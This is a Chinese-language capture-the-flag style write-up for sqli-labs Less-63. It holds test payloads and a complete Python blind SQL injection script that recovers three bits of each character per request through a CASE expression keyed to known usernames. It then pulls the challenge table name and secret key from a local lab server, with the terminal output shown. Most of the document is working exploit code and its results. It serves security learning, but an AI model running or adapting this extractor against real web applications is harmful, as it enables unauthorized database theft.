---
title: less63
url: https://www.yuque.com/u29002979/ep2zrx/bau6im4huo8wg4k9
---

```bash
$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
```

闭合方式为字符型，单引号闭合，
需要使用盲注逐个猜解，SQLmap在130次内可能难以获得通关密码，
最好用轻量级的脚本获取

`?id=1' and 1=2--+`
`?id=1' and 1=1--+`

python脚本

```bash
#!/usr/bin/python3
# -*-coding:utf-8-*-

import re
import requests


url = "http://192.168.31.193/Less-63/?id=1"  # 改成你的地址
try_count = 0

def extract_bits(query, i, bit_values: list):
    """
    获取query执行结果的第 i 个（从1开始算）字符的3个比特
    哪3个比特由bit_values指定
    """
    global try_count

    assert len(bit_values) == 8
    bit_marks = 0
    for v in bit_values:
        bit_marks |= v


    payload = """
    '+(
SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) & ({bit_mark})
    WHEN {0} THEN 1
    WHEN {1} THEN 2
    WHEN {2} THEN 3
    WHEN {3} THEN 4
    WHEN {4} THEN 5
    WHEN {5} THEN 6
    WHEN {6} THEN 7
    ELSE 8
END
)+'
    """.format(*bit_values[:7], query=query, bit_mark=bit_marks, i=i)
    payload = re.sub(r'\s+', ' ', payload.strip().replace("\n", " "))
    # print(payload)

    resp = requests.get(url, params={"id": payload})
    try_count += 1

    infos = ["Angelina", "Dummy", "secure", "stupid", "superman", "batman", "admin", "admin1"]

    match = re.search(r"Your Login name : (.*?)<br>", resp.text)
    assert match
    assert match.group(1) in infos
    bits = bit_values[infos.index(match.group(1))]
    return bits

def extract_data(query, length):
    """
    获取query查询结果的length个字符，每个字符只获取其第7位和前5位
    """
    res = ""
    for i in range(1, length+1):
        b2 = extract_bits(query, i, [0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111])  # 00000111
        b1 = extract_bits(query, i, [0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000])  # 01011000
        if b1 & 0b01000000 == 0:
            # 该字符为数字
            bit = b1 | b2 | 0b00100000
        else:
            # 该字符为字母
            bit = b1 | b2
        res += chr(bit)
    return res


if __name__ == "__main__":
    table_name = extract_data("select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1", 10)
    print("table_name:", table_name)

    secret_key = extract_data("select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name, 24)
    print("secret_key:", secret_key)

    print("Done. try_count:", try_count)
```

```bash
┌──(root㉿guoyx)-[/home/kali]
└─# python3 1.py
table_name: 50MB3MQNDS
secret_key: NJ3L1WZTKRVPKNLU55LFORLL
Done. try_count: 68

```
